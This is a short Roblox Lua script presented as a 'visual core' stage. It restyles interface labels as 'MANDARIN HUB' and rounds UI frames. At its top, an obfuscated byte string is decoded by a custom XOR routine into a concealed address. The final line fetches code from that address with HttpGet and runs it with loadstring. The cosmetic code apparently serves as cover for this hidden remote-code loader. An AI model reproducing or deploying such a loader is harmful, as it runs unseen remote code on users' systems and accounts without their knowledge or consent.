
--[[ STAGE 2: VISUAL CORE ]]
local erY6DohoWw9JC5gjwDPs="\184\168\172\172\179\126\151\155\192\213\203\208\229\230\241\250\190\247\007\009\207\246\009\003\223\008\207\210\018\012\012\228\056"local ofK1kAgHQATeucsCq7ZT=144 local _WklbQi2Ww4pFXYIGIbw2j=187 local CpbgLIuW3vXBkUcCzfsaXw=0 local SUAFv8QBMSEHBui0WyJ1=4 local lYTvhGXEVyn3RQWyYCqrD=1 local jfqqFqVZ01Iuqz0DjSv=false local cO27eJG6uXl85j=bit32 and bit32.bxor if not cO27eJG6uXl85j then cO27eJG6uXl85j=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local RD8jC2pHXUWOizNjc7JiF={}for uI5HFB40X4h4Kqod=1,#erY6DohoWw9JC5gjwDPs do local xks_qzJr2xiXrnwf0b_TB=string.byte(erY6DohoWw9JC5gjwDPs,uI5HFB40X4h4Kqod)local GTts0nhQfzEwOQ=(_WklbQi2Ww4pFXYIGIbw2j+(uI5HFB40X4h4Kqod*SUAFv8QBMSEHBui0WyJ1)+lYTvhGXEVyn3RQWyYCqrD)%256 if CpbgLIuW3vXBkUcCzfsaXw==0 then xks_qzJr2xiXrnwf0b_TB=(xks_qzJr2xiXrnwf0b_TB-GTts0nhQfzEwOQ)%256 RD8jC2pHXUWOizNjc7JiF[uI5HFB40X4h4Kqod]=string.char(cO27eJG6uXl85j(xks_qzJr2xiXrnwf0b_TB,ofK1kAgHQATeucsCq7ZT))else xks_qzJr2xiXrnwf0b_TB=cO27eJG6uXl85j(xks_qzJr2xiXrnwf0b_TB,ofK1kAgHQATeucsCq7ZT)RD8jC2pHXUWOizNjc7JiF[uI5HFB40X4h4Kqod]=string.char((xks_qzJr2xiXrnwf0b_TB-GTts0nhQfzEwOQ)%256)end end local Mb0OliF0jZNxV=table.concat(RD8jC2pHXUWOizNjc7JiF)if jfqqFqVZ01Iuqz0DjSv then Mb0OliF0jZNxV=string.reverse(Mb0OliF0jZNxV)end local Vu96njSXb65_Dr=Mb0OliF0jZNxV
local HubName = "MANDARIN HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(Vu96njSXb65_Dr))()
